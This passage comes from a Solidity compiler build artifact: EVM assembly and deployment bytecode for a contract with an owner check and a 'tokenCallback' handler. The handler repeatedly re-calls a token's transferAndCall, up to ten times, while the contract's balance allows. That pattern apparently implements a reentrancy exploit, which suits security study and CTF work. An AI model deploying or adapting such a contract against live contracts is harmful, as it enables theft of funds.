tag_130\n      tag_76\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":2350:2472   */\n    tag_129:\n        /* \"#utility.yul\":2504:2510   */\n      dup3\n        /* \"#utility.yul\":2491:2511   */\n      calldataload\n        /* \"#utility.yul\":2481:2511   */\n      swap1\n      pop\n        /* \"#utility.yul\":2534:2552   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":2526:2532   */\n      dup2\n        /* \"#utility.yul\":2523:2553   */\n      gt\n        /* \"#utility.yul\":2520:2637   */\n      iszero\n      tag_131\n      jumpi\n        /* \"#utility.yul\":2556:2635   */\n      tag_132\n      tag_77\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":2520:2637   */\n    tag_131:\n        /* \"#utility.yul\":2670:2674   */\n      0x20\n        /* \"#utility.yul\":2662:2668   */\n      dup4\n        /* \"#utility.yul\":2658:2675   */\n      add\n        /* \"#utility.yul\":2646:2675   */\n      swap2\n      pop\n        /* \"#utility.yul\":2724:2727   */\n      dup4\n        /* \"#utility.yul\":2716:2720   */\n      0x01\n        /* \"#utility.yul\":2708:2714   */\n      dup3\n        /* \"#utility.yul\":2704:2721   */\n      mul\n        /* \"#utility.yul\":2694:2702   */\n      dup4\n        /* \"#utility.yul\":2690:2722   */\n      add\n        /* \"#utility.yul\":2687:2728   */\n      gt\n        /* \"#utility.yul\":2684:2812   */\n      iszero\n      tag_133\n      jumpi\n        /* \"#utility.yul\":2731:2810   */\n      tag_134\n      tag_78\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":2684:2812   */\n    tag_133:\n        /* \"#utility.yul\":2266:2818   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2824:3641   */\n    tag_23:\n        /* \"#utility.yul\":2912:2918   */\n      0x00\n        /* \"#utility.yul\":2920:2926   */\n      dup1\n        /* \"#utility.yul\":2928:2934   */\n      0x00\n        /* \"#utility.yul\":2936:2942   */\n      dup1\n        /* \"#utility.yul\":2985:2987   */\n      0x60\n        /* \"#utility.yul\":2973:2982   */\n      dup6\n        /* \"#utility.yul\":2964:2971   */\n      dup8\n        /* \"#utility.yul\":2960:2983   */\n      sub\n        /* \"#utility.yul\":2956:2988   */\n      slt\n        /* \"#utility.yul\":2953:3072   */\n      iszero\n      tag_136\n      jumpi\n        /* \"#utility.yul\":2991:3070   */\n      tag_137\n      tag_68\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":2953:3072   */\n    tag_136:\n        /* \"#utility.yul\":3111:3112   */\n      0x00\n        /* \"#utility.yul\":3136:3189   */\n      tag_138\n        /* \"#utility.yul\":3181:3188   */\n      dup8\n        /* \"#utility.yul\":3172:3178   */\n      dup3\n        /* \"#utility.yul\":3161:3170   */\n      dup9\n        /* \"#utility.yul\":3157:3179   */\n      add\n        /* \"#utility.yul\":3136:3189   */\n      tag_75\n      jump\t// in\n    tag_138:\n        /* \"#utility.yul\":3126:3189   */\n      swap5\n      pop\n        /* \"#utility.yul\":3082:3199   */\n      pop\n        /* \"#utility.yul\":3238:3240   */\n      0x20\n        /* \"#utility.yul\":3264:3317   */\n      tag_139\n        /* \"#utility.yul\":3309:3316   */\n      dup8\n        /* \"#utility.yul\":3300:3306   */\n      dup3\n        /* \"#utility.yul\":3289:3298   */\n      dup9\n        /* \"#utility.yul\":3285:3307   */\n      add\n        /* \"#utility.yul\":3264:3317   */\n      tag_71\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":3254:3317   */\n      swap4\n      pop\n        /* \"#utility.yul\":3209:3327   */\n      pop\n        /* \"#utility.yul\":3394:3396   */\n      0x40\n        /* \"#utility.yul\":3383:3392   */\n      dup6\n        /* \"#utility.yul\":3379:3397   */\n      add\n        /* \"#utility.yul\":3366:3398   */\n      calldataload\n        /* \"#utility.yul\":3425:3443   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":3417:3423   */\n      dup2\n        /* \"#utility.yul\":3414:3444   */\n      gt\n        /* \"#utility.yul\":3411:3528   */\n      iszero\n      tag_140\n      jumpi\n        /* \"#utility.yul\":3447:3526   */\n      tag_141\n      tag_69\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":3411:3528   */\n    tag_140:\n        /* \"#utility.yul\":3560:3624   */\n      tag_142\n        /* \"#utility.yul\":3616:3623   */\n      dup8\n        /* \"#utility.yul\":3607:3613   */\n      dup3\n        /* \"#utility.yul\":3596:3605   */\n      dup9\n        /* \"#utility.yul\":3592:3614   */\n      add\n        /* \"#utility.yul\":3560:3624   */\n      tag_79\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":3542:3624   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":3337:3634   */\n      pop\n        /* \"#utility.yul\":2824:3641   */\n      swap3\n      swap6\n      swap2\n      swap5\n      pop\n      swap3\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3647:3765   */\n    tag_80:\n        /* \"#utility.yul\":3734:3758   */\n      tag_144\n        /* \"#utility.yul\":3752:3757   */\n      dup2\n        /* \"#utility.yul\":3734:3758   */\n      tag_73\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":3729:3732   */\n      dup3\n        /* \"#utility.yul\":3722:3759   */\n      mstore\n        /* \"#utility.yul\":3647:3765   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3771:3993   */\n    tag_31:\n        /* \"#utility.yul\":3864:3868   */\n      0x00\n        /* \"#utility.yul\":3902:3904   */\n      0x20\n        /* \"#utility.yul\":3891:3900   */\n      dup3\n        /* \"#utility.yul\":3887:3905   */\n      add\n        /* \"#utility.yul\":3879:3905   */\n      swap1\n      pop\n        /* \"#utility.yul\":3915:3986   */\n      tag_146\n        /* \"#utility.yul\":3983:3984   */\n      0x00\n        /* \"#utility.yul\":3972:3981   */\n      dup4\n        /* \"#utility.yul\":3968:3985   */\n      add\n        /* \"#utility.yul\":3959:3965   */\n      dup5\n        /* \"#utility.yul\":3915:3986   */\n      tag_80\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":3771:3993   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3999:4059   */\n    tag_81:\n        /* \"#utility.yul\":4027:4030   */\n      0x00\n        /* \"#utility.yul\":4048:4053   */\n      dup2\n        /* \"#utility.yul\":4041:4053   */\n      swap1\n      pop\n        /* \"#utility.yul\":3999:4059   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4065:4207   */\n    tag_82:\n        /* \"#utility.yul\":4115:4124   */\n      0x00\n        /* \"#utility.yul\":4148:4201   */\n      tag_149\n        /* \"#utility.yul\":4166:4200   */\n      tag_150\n        /* \"#utility.yul\":4175:4199   */\n      tag_151\n        /* \"#utility.yul\":4193:4198   */\n      dup5\n        /* \"#utility.yul\":4175:4199   */\n      tag_72\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":4166:4200   */\n      tag_81\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":4148:4201   */\n      tag_72\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":4135:4201   */\n      swap1\n      pop\n        /* \"#utility.yul\":4065:4207   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4213:4339   */\n    tag_83:\n        /* \"#utility.yul\":4263:4272   */\n      0x00\n        /* \"#utility.yul\":4296:4333   */\n      tag_153\n        /* \"#utility.yul\":4327:4332   */\n      dup3\n        /* \"#utility.yul\":4296:4333   */\n      tag_82\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":4283:4333   */\n      swap1\n      pop\n        /* \"#utility.yul\":4213:4339   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4345:4495   */\n    tag_84:\n        /* \"#utility.yul\":4419:4428   */\n      0x00\n        /* \"#utility.yul\":4452:4489   */\n      tag_155\n        /* \"#utility.yul\":4483:4488   */\n      dup3\n        /* \"#utility.yul\":4452:4489   */\n      tag_83\n      jump\t// in\n    tag_155:\n        /* \"#utility.yul\":4439:4489   */\n      swap1\n      pop\n        /* \"#utility.yul\":4345:4495   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4501:4680   */\n    tag_85:\n        /* \"#utility.yul\":4612:4673   */\n      tag_157\n        /* \"#utility.yul\":4667:4672   */\n      dup2\n        /* \"#utility.yul\":4612:4673   */\n      tag_84\n      jump\t// in\n    tag_157:\n        /* \"#utility.yul\":4607:4610   */\n      dup3\n        /* \"#utility.yul\":4600:4674   */\n      mstore\n        /* \"#utility.yul\":4501:4680   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4686:4956   */\n    tag_35:\n        /* \"#utility.yul\":4803:4807   */\n      0x00\n        /* \"#utility.yul\":4841:4843   */\n      0x20\n        /* \"#utility.yul\":4830:4839   */\n      dup3\n        /* \"#utility.yul\":4826:4844   */\n      add\n        /* \"#utility.yul\":4818:4844   */\n      swap1\n      pop\n        /* \"#utility.yul\":4854:4949   */\n      tag_159\n        /* \"#utility.yul\":4946:4947   */\n      0x00\n        /* \"#utility.yul\":4935:4944   */\n      dup4\n        /* \"#utility.yul\":4931:4948   */\n      add\n        /* \"#utility.yul\":4922:4928   */\n      dup5\n        /* \"#utility.yul\":4854:4949   */\n      tag_85\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":4686:4956   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4962:5131   */\n    tag_86:\n        /* \"#utility.yul\":5046:5057   */\n      0x00\n        /* \"#utility.yul\":5080:5086   */\n      dup3\n        /* \"#utility.yul\":5075:5078   */\n      dup3\n        /* \"#utility.yul\":5068:5087   */\n      mstore\n        /* \"#utility.yul\":5120:5124   */\n      0x20\n        /* \"#utility.yul\":5115:5118   */\n      dup3\n        /* \"#utility.yul\":5111:5125   */\n      add\n        /* \"#utility.yul\":5096:5125   */\n      swap1\n      pop\n        /* \"#utility.yul\":4962:5131   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5137:5296   */\n    tag_87:\n        /* \"#utility.yul\":5277:5288   */\n      0x4e6f74206f776e65720000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5273:5274   */\n      0x00\n        /* \"#utility.yul\":5265:5271   */\n      dup3\n        /* \"#utility.yul\":5261:5275   */\n      add\n        /* \"#utility.yul\":5254:5289   */\n      mstore\n        /* \"#utility.yul\":5137:5296   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5302:5667   */\n    tag_88:\n        /* \"#utility.yul\":5444:5447   */\n      0x00\n        /* \"#utility.yul\":5465:5531   */\n      tag_163\n        /* \"#utility.yul\":5529:5530   */\n      0x09\n        /* \"#utility.yul\":5524:5527   */\n      dup4\n        /* \"#utility.yul\":5465:5531   */\n      tag_86\n      jump\t// in\n    tag_163:\n        /* \"#utility.yul\":5458:5531   */\n      swap2\n      pop\n        /* \"#utility.yul\":5540:5633   */\n      tag_164\n        /* \"#utility.yul\":5629:5632   */\n      dup3\n        /* \"#utility.yul\":5540:5633   */\n      tag_87\n      jump\t// in\n    tag_164:\n        /* \"#utility.yul\":5658:5660   */\n      0x20\n        /* \"#utility.yul\":5653:5656   */\n      dup3\n        /* \"#utility.yul\":5649:5661   */\n      add\n        /* \"#utility.yul\":5642:5661   */\n      swap1\n      pop\n        /* \"#utility.yul\":5302:5667   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5673:6092   */\n    tag_39:\n        /* \"#utility.yul\":5839:5843   */\n      0x00\n        /* \"#utility.yul\":5877:5879   */\n      0x20\n        /* \"#utility.yul\":5866:5875   */\n      dup3\n        /* \"#utility.yul\":5862:5880   */\n      add\n        /* \"#utility.yul\":5854:5880   */\n      swap1\n      pop\n        /* \"#utility.yul\":5926:5935   */\n      dup2\n        /* \"#utility.yul\":5920:5924   */\n      dup2\n        /* \"#utility.yul\":5916:5936   */\n      sub\n        /* \"#utility.yul\":5912:5913   */\n      0x00\n        /* \"#utility.yul\":5901:5910   */\n      dup4\n        /* \"#utility.yul\":5897:5914   */\n      add\n        /* \"#utility.yul\":5890:5937   */\n      mstore\n        /* \"#utility.yul\":5954:6085   */\n      tag_166\n        /* \"#utility.yul\":6080:6084   */\n      dup2\n        /* \"#utility.yul\":5954:6085   */\n      tag_88\n      jump\t// in\n    tag_166:\n        /* \"#utility.yul\":5946:6085   */\n      swap1\n      pop\n        /* \"#utility.yul\":5673:6092   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6098:6266   */\n    tag_89:\n        /* \"#utility.yul\":6181:6192   */\n      0x00\n        /* \"#utility.yul\":6215:6221   */\n      dup3\n        /* \"#utility.yul\":6210:6213   */\n      dup3\n        /* \"#utility.yul\":6203:6222   */\n      mstore\n        /* \"#utility.yul\":6255:6259   */\n      0x20\n        /* \"#utility.yul\":6250:6253   */\n      dup3\n        /* \"#utility.yul\":6246:6260   */\n      add\n        /* \"#utility.yul\":6231:6260   */\n      swap1\n      pop\n        /* \"#utility.yul\":6098:6266   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6272:6386   */\n    tag_90:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6392:6754   */\n    tag_91:\n        /* \"#utility.yul\":6533:6536   */\n      0x00\n        /* \"#utility.yul\":6554:6619   */\n      tag_170\n        /* \"#utility.yul\":6617:6618   */\n      0x00\n        /* \"#utility.yul\":6612:6615   */\n      dup4\n        /* \"#utility.yul\":6554:6619   */\n      tag_89\n      jump\t// in\n    tag_170:\n        /* \"#utility.yul\":6547:6619   */\n      swap2\n      pop\n        /* \"#utility.yul\":6628:6721   */\n      tag_171\n        /* \"#utility.yul\":6717:6720   */\n      dup3\n        /* \"#utility.yul\":6628:6721   */\n      tag_90\n      jump\t// in\n    tag_171:\n        /* \"#utility.yul\":6746:6747   */\n      0x00\n        /* \"#utility.yul\":6741:6744   */\n      dup3\n        /* \"#utility.yul\":6737:6748   */\n      add\n        /* \"#utility.yul\":6730:6748   */\n      swap1\n      pop\n        /* \"#utility.yul\":6392:6754   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6760:6983   */\n    tag_92:\n        /* \"#utility.yul\":6900:6934   */\n      0x746f6b656e43616c6c6261636b28616464726573732c75696e743235362c6279\n        /* \"#utility.yul\":6896:6897   */\n      0x00\n        /* \"#utility.yul\":6888:6894   */\n      dup3\n        /* \"#utility.yul\":6884:6898   */\n      add\n        /* \"#utility.yul\":6877:6935   */\n      mstore\n        /* \"#utility.yul\":6969:6975   */\n      0x7465732900000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":6964:6966   */\n      0x20\n        /* \"#utility.yul\":6956:6962   */\n      dup3\n        /* \"#utility.yul\":6952:6967   */\n      add\n        /* \"#utility.yul\":6945:6976   */\n      mstore\n        /* \"#utility.yul\":6760:6983   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6989:7355   */\n    tag_93:\n        /* \"#utility.yul\":7131:7134   */\n      0x00\n        /* \"#utility.yul\":7152:7219   */\n      tag_174\n        /* \"#utility.yul\":7216:7218   */\n      0x24\n        /* \"#utility.yul\":7211:7214   */\n      dup4\n        /* \"#utility.yul\":7152:7219   */\n      tag_86\n      jump\t// in\n    tag_174:\n        /* \"#utility.yul\":7145:7219   */\n      swap2\n      pop\n        /* \"#utility.yul\":7228:7321   */\n      tag_175\n        /* \"#utility.yul\":7317:7320   */\n      dup3\n        /* \"#utility.yul\":7228:7321   */\n      tag_92\n      jump\t// in\n    tag_175:\n        /* \"#utility.yul\":7346:7348   */\n      0x40\n        /* \"#utility.yul\":7341:7344   */\n      dup3\n        /* \"#utility.yul\":7337:7349   */\n      add\n        /* \"#utility.yul\":7330:7349   */\n      swap1\n      pop\n        /* \"#utility.yul\":6989:7355   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7361:8306   */\n    tag_46:\n        /* \"#utility.yul\":7683:7687   */\n      0x00\n        /* \"#utility.yul\":7721:7724   */\n      0x80\n        /* \"#utility.yul\":7710:7719   */\n      dup3\n        /* \"#utility.yul\":7706:7725   */\n      add\n        /* \"#utility.yul\":7698:7725   */\n      swap1\n      pop\n        /* \"#utility.yul\":7735:7806   */\n      tag_177\n        /* \"#utility.yul\":7803:7804   */\n      0x00\n        /* \"#utility.yul\":7792:7801   */\n      dup4\n        /* \"#utility.yul\":7788:7805   */\n      add\n        /* \"#utility.yul\":7779:7785   */\n      dup6\n        /* \"#utility.yul\":7735:7806   */\n      tag_80\n      jump\t// in\n    tag_177:\n        /* \"#utility.yul\":7816:7888   */\n      tag_178\n        /* \"#utility.yul\":7884:7886   */\n      0x20\n        /* \"#utility.yul\":7873:7882   */\n      dup4\n        /* \"#utility.yul\":7869:7887   */\n      add\n        /* \"#utility.yul\":7860:7866   */\n      dup5\n        /* \"#utility.yul\":7816:7888   */\n      tag_66\n      jump\t// in\n    tag_178:\n        /* \"#utility.yul\":7935:7944   */\n      dup2\n        /* \"#utility.yul\":7929:7933   */\n      dup2\n        /* \"#utility.yul\":7925:7945   */\n      sub\n        /* \"#utility.yul\":7920:7922   */\n      0x40\n        /* \"#utility.yul\":7909:7918   */\n      dup4\n        /* \"#utility.yul\":7905:7923   */\n      add\n        /* \"#utility.yul\":7898:7946   */\n      mstore\n        /* \"#utility.yul\":7963:8093   */\n      tag_179\n        /* \"#utility.yul\":8088:8092   */\n      dup2\n        /* \"#utility.yul\":7963:8093   */\n      tag_91\n      jump\t// in\n    tag_179:\n        /* \"#utility.yul\":7955:8093   */\n      swap1\n      pop\n        /* \"#utility.yul\":8140:8149   */\n      dup2\n        /* \"#utility.yul\":8134:8138   */\n      dup2\n        /* \"#utility.yul\":8130:8150   */\n      sub\n        /* \"#utility.yul\":8125:8127   */\n      0x60\n        /* \"#utility.yul\":8114:8123   */\n      dup4\n        /* \"#utility.yul\":8110:8128   */\n      add\n        /* \"#utility.yul\":8103:8151   */\n      mstore\n        /* \"#utility.yul\":8168:8299   */\n      tag_180\n        /* \"#utility.yul\":8294:8298   */\n      dup2\n        /* \"#utility.yul\":8168:8299   */\n      tag_93\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":8160:8299   */\n      swap1\n      pop\n        /* \"#utility.yul\":7361:8306   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8312:8402   */\n    tag_94:\n        /* \"#utility.yul\":8346:8353   */\n      0x00\n        /* \"#utility.yul\":8389:8394   */\n      dup2\n        /* \"#utility.yul\":8382:8395   */\n      iszero\n        /* \"#utility.yul\":8375:8396   */\n      iszero\n        /* \"#utility.yul\":8364:8396   */\n      swap1\n      pop\n        /* \"#utility.yul\":8312:8402   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8408:8524   */\n    tag_95:\n        /* \"#utility.yul\":8478:8499   */\n      tag_183\n        /* \"#utility.yul\":8493:8498   */\n      dup2\n        /* \"#utility.yul\":8478:8499   */\n      tag_94\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":8471:8476   */\n      dup2\n        /* \"#utility.yul\":8468:8500   */\n      eq\n        /* \"#utility.yul\":8458:8518   */\n      tag_184\n      jumpi\n        /* \"#utility.yul\":8514:8515   */\n      0x00\n        /* \"#utility.yul\":8511:8512   */\n      dup1\n        /* \"#utility.yul\":8504:8516   */\n      revert\n        /* \"#utility.yul\":8458:8518   */\n    tag_184:\n        /* \"#utility.yul\":8408:8524   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8530:8667   */\n    tag_96:\n        /* \"#utility.yul\":8584:8589   */\n      0x00\n        /* \"#utility.yul\":8615:8621   */\n      dup2\n        /* \"#utility.yul\":8609:8622   */\n      mload\n        /* \"#utility.yul\":8600:8622   */\n      swap1\n      pop\n        /* \"#utility.yul\":8631:8661   */\n      tag_186\n        /* \"#utility.yul\":8655:8660   */\n      dup2\n        /* \"#utility.yul\":8631:8661   */\n      tag_95\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":8530:8667   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8673:9018   */\n    tag_50:\n        /* \"#utility.yul\":8740:8746   */\n      0x00\n        /* \"#utility.yul\":8789:8791   */\n      0x20\n        /* \"#utility.yul\":8777:8786   */\n      dup3\n        /* \"#utility.yul\":8768:8775   */\n      dup5\n        /* \"#utility.yul\":8764:8787   */\n      sub\n        /* \"#utility.yul\":8760:8792   */\n      slt\n        /* \"#utility.yul\":8757:8876   */\n      iszero\n      tag_188\n      jumpi\n        /* \"#utility.yul\":8795:8874   */\n      tag_189\n      tag_68\n      jump\t// in\n    tag_189:\n        /* \"#utility.yul\":8757:8876   */\n    tag_188:\n        /* \"#utility.yul\":8915:8916   */\n      0x00\n        /* \"#utility.yul\":8940:9001   */\n      tag_190\n        /* \"#utility.yul\":8993:9000   */\n      dup5\n        /* \"#utility.yul\":8984:8990   */\n      dup3\n        /* \"#utility.yul\":8973:8982   */\n      dup6\n        /* \"#utility.yul\":8969:8991   */\n      add\n        /* \"#utility.yul\":8940:9001   */\n      tag_96\n      jump\t// in\n    tag_190:\n        /* \"#utility.yul\":8930:9001   */\n      swap2\n      pop\n        /* \"#utility.yul\":8886:9011   */\n      pop\n        /* \"#utility.yul\":8673:9018   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9024:9167   */\n    tag_97:\n        /* \"#utility.yul\":9081:9086   */\n      0x00\n        /* \"#utility.yul\":9112:9118   */\n      dup2\n        /* \"#utility.yul\":9106:9119   */\n      mload\n        /* \"#utility.yul\":9097:9119   */\n      swap1\n      pop\n        /* \"#utility.yul\":9128:9161   */\n      tag_192\n        /* \"#utility.yul\":9155:9160   */\n      dup2\n        /* \"#utility.yul\":9128:9161   */\n      tag_70\n      jump\t// in\n    tag_192:\n        /* \"#utility.yul\":9024:9167   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9173:9524   */\n    tag_57:\n        /* \"#utility.yul\":9243:9249   */\n      0x00\n        /* \"#utility.yul\":9292:9294   */\n      0x20\n        /* \"#utility.yul\":9280:9289   */\n      dup3\n        /* \"#utility.yul\":9271:9278   */\n      dup5\n        /* \"#utility.yul\":9267:9290   */\n      sub\n        /* \"#utility.yul\":9263:9295   */\n      slt\n        /* \"#utility.yul\":9260:9379   */\n      iszero\n      tag_194\n      jumpi\n        /* \"#utility.yul\":9298:9377   */\n      tag_195\n      tag_68\n      jump\t// in\n    tag_195:\n        /* \"#utility.yul\":9260:9379   */\n    tag_194:\n        /* \"#utility.yul\":9418:9419   */\n      0x00\n        /* \"#utility.yul\":9443:9507   */\n      tag_196\n        /* \"#utility.yul\":9499:9506   */\n      dup5\n        /* \"#utility.yul\":9490:9496   */\n      dup3\n        /* \"#utility.yul\":9479:9488   */\n      dup6\n        /* \"#utility.yul\":9475:9497   */\n      add\n        /* \"#utility.yul\":9443:9507   */\n      tag_97\n      jump\t// in\n    tag_196:\n        /* \"#utility.yul\":9433:9507   */\n      swap2\n      pop\n        /* \"#utility.yul\":9389:9517   */\n      pop\n        /* \"#utility.yul\":9173:9524   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":9530:9710   */\n    tag_98:\n        /* \"#utility.yul\":9578:9655   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":9575:9576   */\n      0x00\n        /* \"#utility.yul\":9568:9656   */\n      mstore\n        /* \"#utility.yul\":9675:9679   */\n      0x11\n        /* \"#utility.yul\":9672:9673   */\n      0x04\n        /* \"#utility.yul\":9665:9680   */\n      mstore\n        /* \"#utility.yul\":9699:9703   */\n      0x24\n        /* \"#utility.yul\":9696:9697   */\n      0x00\n        /* \"#utility.yul\":9689:9704   */\n      revert\n        /* \"#utility.yul\":9716:9949   */\n    tag_60:\n        /* \"#utility.yul\":9755:9758   */\n      0x00\n        /* \"#utility.yul\":9778:9802   */\n      tag_199\n        /* \"#utility.yul\":9796:9801   */\n      dup3\n        /* \"#utility.yul\":9778:9802   */\n      tag_65\n      jump\t// in\n    tag_199:\n        /* \"#utility.yul\":9769:9802   */\n      swap2\n      pop\n        /* \"#utility.yul\":9824:9890   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":9817:9822   */\n      dup3\n        /* \"#utility.yul\":9814:9891   */\n      sub\n        /* \"#utility.yul\":9811:9914   */\n      tag_200\n      jumpi\n        /* \"#utility.yul\":9894:9912   */\n      tag_201\n      tag_98\n      jump\t// in\n    tag_201:\n        /* \"#utility.yul\":9811:9914   */\n    tag_200:\n        /* \"#utility.yul\":9941:9942   */\n      0x01\n        /* \"#utility.yul\":9934:9939   */\n      dup3\n        /* \"#utility.yul\":9930:9943   */\n      add\n        /* \"#utility.yul\":9923:9943   */\n      swap1\n      pop\n        /* \"#utility.yul\":9716:9949   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a933c51e4d3550d8a8d4e590f267385cc290950180bbeddd8fc5036d4b8e6f5a64736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610b7b380380610b7b83398181016040528101906100319190610114565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f80fd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b610a2f8061014c5f395ff3fe608060405234801561000f575f80fd5b506004361061007b575f3560e01c80636be32e73116100595780636be32e73146100c35780638c59507c146100df5780638da5cb5b146100fd578063fc0c546a1461011b5761007b565b80633ccfd60b1461007f578063407c28211461008957806364dd891a146100a7575b5f80fd5b610087610139565b005b61009161022f565b60405161009e9190610540565b60405180910390f35b6100c160048036038101906100bc919061058b565b610235565b005b6100dd60048036038101906100d89190610671565b610370565b005b6100e76104da565b6040516100f49190610540565b60405180910390f35b6101056104e0565b60405161011291906106f1565b60405180910390f35b610123610505565b6040516101309190610765565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146101c8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101bf906107d8565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561022c573d5f803e3d5ffd5b50565b60025481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102c4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102bb906107d8565b60405180910390fd5b806003819055505f6002819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f6368f8a30836040518363ffffffff1660e01b815260040161032c929190610899565b6020604051808303815f875af1158015610348573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061036c919061091b565b5050565b600a60025410801561041a57506003545f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016103d891906106f1565b602060405180830381865afa1580156103f3573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610417919061095a565b10155b156104d45760025f815480929190610431906109b2565b91905055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f6368f8a306003546040518363ffffffff1660e01b8152600401610492929190610899565b6020604051808303815f875af11580156104ae573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104d2919061091b565b505b50505050565b60035481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f819050919050565b61053a81610528565b82525050565b5f6020820190506105535f830184610531565b92915050565b5f80fd5b5f80fd5b61056a81610528565b8114610574575f80fd5b50565b5f8135905061058581610561565b92915050565b5f602082840312156105a05761059f610559565b5b5f6105ad84828501610577565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6105df826105b6565b9050919050565b6105ef816105d5565b81146105f9575f80fd5b50565b5f8135905061060a816105e6565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f84011261063157610630610610565b5b8235905067ffffffffffffffff81111561064e5761064d610614565b5b60208301915083600182028301111561066a57610669610618565b5b9250929050565b5f805f806060858703121561068957610688610559565b5b5f610696878288016105fc565b94505060206106a787828801610577565b935050604085013567ffffffffffffffff8111156106c8576106c761055d565b5b6106d48782880161061c565b925092505092959194509250565b6106eb816105d5565b82525050565b5f6020820190506107045f8301846106e2565b92915050565b5f819050919050565b5f61072d610728610723846105b6565b61070a565b6105b6565b9050919050565b5f61073e82610713565b9050919050565b5f61074f82610734565b9050919050565b61075f81610745565b82525050565b5f6020820190506107785f830184610756565b92915050565b5f82825260208201905092915050565b7f4e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b